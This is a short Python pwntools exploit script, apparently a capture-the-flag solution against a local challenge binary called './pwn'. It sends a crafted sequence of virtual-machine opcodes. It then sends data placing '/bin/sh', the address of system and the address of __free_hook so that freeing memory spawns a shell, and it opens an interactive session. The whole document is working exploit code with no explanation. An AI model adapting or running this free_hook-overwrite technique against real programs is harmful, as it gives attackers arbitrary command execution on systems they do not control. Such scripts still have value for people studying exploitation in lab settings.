from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./pwn")
p = process("./pwn")

free_hook = 0x80e09f0
system = 0x8051c60

SAVE = 0x10101010
POP = 0xffff28
MUL = 0xabcef
SUB = 0x11111
PUSH = 0x2a3d
DIV = 0x514
LOAD = -1
ADD = 0x0

opcode = [
    PUSH,
    PUSH,
    PUSH,
    PUSH,
    LOAD,
    PUSH,
    SUB,
    DIV,
    SAVE,
]

payload = ' '.join([str(v) for v in opcode])
p.sendline(payload)

data = [
    "/bin/sh",
    system,
    4,
    0x42,
    free_hook,
]

# gdb.attach(p,"b *0x8049c29")
payload = ' '.join([str(v) for v in data])
p.sendline(payload)

p.interactive()
